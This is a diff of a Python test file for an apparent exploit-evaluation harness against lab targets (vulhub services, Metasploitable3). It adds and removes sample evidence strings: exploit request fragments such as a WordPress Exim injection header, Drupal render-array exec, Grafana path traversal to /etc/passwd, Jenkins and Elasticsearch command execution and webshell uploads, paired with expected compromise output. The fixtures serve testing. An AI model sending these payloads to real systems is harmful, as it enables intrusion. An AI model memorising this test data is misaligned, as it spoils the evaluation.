@@ -18,7 +18,6 @@ SAMPLE_EVIDENCE = {
     "vuln_weblogic_rce": "ldap://10.10.11.50:16667/Exploit PORTAL_TARGET_POSTCONDITION:weblogic-ldap-callback",
     "vuln_laravel_rce": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt PORTAL_TARGET_POSTCONDITION:laravel-rce:/tmp/portal-laravel-proof",
     "vuln_wordpress_rce": "POST /wp-login.php?action=lostpassword Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin} null) PORTAL_TARGET_POSTCONDITION:wordpress-rce:/tmp/portal-wordpress-proof",
-    "vuln_confluence_rce": "GET /ServletActionContext.setHeader.X-Cmd-Response HTTP/1.1 X-Cmd-Response: uid=1000(confluence) gid=1000(confluence)",
     "vuln_drupal_rce": "POST /user/register?x mail%5B%23post_render%5D%5B%5D=exec uid=33(www-data) gid=33(www-data)",
     "vuln_solr_rce": "POST /solr/demo/config params.resource.loader.enabled POST /solr/demo/select?v.template=custom uid=8983(solr) gid=8983(solr)",
     "vuln_grafana_lfi": "GET /public/plugins/alertlist/../../../../etc/passwd root:x:0:0:root:/root:/bin/bash",
@@ -41,6 +40,20 @@ SAMPLE_EVIDENCE = {
     "vuln_dubbo_rce": "POST /org.vulhub.api.CalcService PORTAL_TARGET_POSTCONDITION:dubbo-rce:/tmp/portal-dubbo-proof",
     "vuln_shiro_deserial": f"GET / Cookie: rememberMe={'A' * 120} PORTAL_TARGET_POSTCONDITION:shiro-rce:/tmp/portal-shiro-proof",
     "vuln_jackson_deserial": "POST /exploit TemplatesImpl transletBytecodes PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt",
+    "meta3_ftp_backdoor": "USER vagrant PASS vagrant 230 User logged in.",
+    "meta3_ssh_brute": "vagrant-2008r2\\vagrant",
+    "meta3_winrm_weakpass": "vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
+    "meta3_smb_exploit": "vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
+    "meta3_psexec": "[+] Executed command via wmiexec vagrant-2008r2\\vagrant",
+    "meta3_snmp_enum": "public iso.3.6.1.2.1.1.1.0 = STRING: Hardware: Intel64 - Software: Windows Version 6.1 (Build 7601)",
+    "meta3_mysql_exploit": "VERSION() 5.5.20-log Database information_schema mysql wordpress",
+    "meta3_linux_privesc": "[+] Executed command (shell type: powershell) vagrant-2008r2\\vagrant True",
+    "meta3_tomcat_manager": "GET /manager/html HTTP/1.1 Tomcat Web Application Manager nt authority\\system",
+    "meta3_elasticsearch_rce": "script_fields exp Runtime.getRuntime().exec whoami nt authority\\system",
+    "meta3_jenkins_rce": "scriptText script=println whoami.execute().text nt authority\\local service",
+    "meta3_webdav_upload": "PUT /uploads/portalproof.php HTTP/1.1 201 Created nt authority\\local service",
+    "meta3_wordpress_ninja": "Uploading payload to /wordpress/wp-content/uploads/nftmp-abc123.php nt authority\\local service",
+    "meta3_full_chain": "Elasticsearch REST API 1.1.1 vagrant-2008R2\\vagrant:vagrant (Pwn3d!) script_fields Runtime.getRuntime().exec nt authority\\local service",
 }
 
 REQUEST_ONLY_EVIDENCE = {
@@ -49,7 +62,6 @@ REQUEST_ONLY_EVIDENCE = {
     "vuln_weblogic_rce": "ldap://10.10.11.50:16667/Exploit",
     "vuln_laravel_rce": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt",
     "vuln_wordpress_rce": "POST /wp-login.php?action=lostpassword Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin} null)",
-    "vuln_confluence_rce": "GET /ServletActionContext.setHeader.X-Cmd-Response HTTP/1.1",
     "vuln_drupal_rce": "POST /user/register?x mail%5B%23post_render%5D%5B%5D=exec",
     "vuln_solr_rce": "POST /solr/demo/config params.resource.loader.enabled POST /solr/demo/select?v.template=custom",
     "vuln_grafana_lfi": "GET /public/plugins/alertlist/../../../../etc/passwd",
@@ -72,6 +84,20 @@ REQUEST_ONLY_EVIDENCE = {
     "vuln_dubbo_rce": "POST /org.vulhub.api.CalcService",
     "vuln_shiro_deserial": f"GET / Cookie: rememberMe={'A' * 120}",
     "vuln_jackson_deserial": "POST /exploit TemplatesImpl transletBytecodes",
+    "meta3_ftp_backdoor": "USER vagrant",
+    "meta3_ssh_brute": "Warning: Permanently added '10.10.11.10' (ECDSA) to the list of known hosts.",
+    "meta3_winrm_weakpass": "SMB 10.10.11.10 445 VAGRANT-2008R2 signing:False",
+    "meta3_smb_exploit": "SMB 10.10.11.10 445 VAGRANT-2008R2 signing:False",
+    "meta3_psexec": "vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
+    "meta3_snmp_enum": "Timeout: No Response from 10.10.11.10",
+    "meta3_mysql_exploit": "VERSION() 5.5.20-log",
+    "meta3_linux_privesc": "vagrant-2008r2\\vagrant",
+    "meta3_tomcat_manager": "GET /manager/html HTTP/1.1",
+    "meta3_elasticsearch_rce": "script_fields exp Runtime.getRuntime().exec whoami",
+    "meta3_jenkins_rce": "scriptText script=println whoami.execute().text",
+    "meta3_webdav_upload": "PUT /uploads/portalproof.php HTTP/1.1",
+    "meta3_wordpress_ninja": "Uploading payload to /wordpress/wp-content/uploads/nftmp-abc123.php",
+    "meta3_full_chain": "Elasticsearch REST API 1.1.1 vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
 }
 
 
@@ -96,8 +122,9 @@ def test_recipes_resolve_runtime_placeholders_and_use_image_contract_tools():
         rendered = render_recipe_command(recipe, host="10.10.11.50", port=12345)
         assert "$TARGET_HOST" not in rendered
         assert "$TARGET_PORT" not in rendered
-        postcondition = render_postcondition_command(recipe, port=12345)
+        postcondition = render_postcondition_command(recipe, port=12345, host="10.10.11.50")
         assert "$TARGET_PORT" not in postcondition
+        assert "$TARGET_HOST" not in postcondition
         for host_command in (recipe.host_setup_command, recipe.host_cleanup_command):
             rendered_host = render_host_command(host_command, host="10.10.11.50", port=12345)
             assert "$TARGET_HOST" not in rendered_host
